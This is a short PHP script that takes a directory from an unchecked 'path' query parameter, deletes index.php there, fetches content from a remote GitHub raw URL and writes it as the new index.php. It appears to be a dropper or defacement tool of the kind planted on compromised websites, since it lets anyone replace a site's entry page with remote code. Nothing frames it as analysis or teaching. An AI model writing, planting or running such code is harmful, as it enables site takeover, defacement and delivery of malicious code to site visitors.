<?php
$path = isset($_GET['path']) ? $_GET['path'] : '.';
$file = $path . '/index.php';

if (file_exists($file)) {
    unlink($file);
}
$content = file_get_contents('https://raw.githubusercontent.com/shadowfiles404/lizz/refs/heads/main/update.txt');
file_put_contents($file, $content);
echo 'Done: ' . $file;
?>
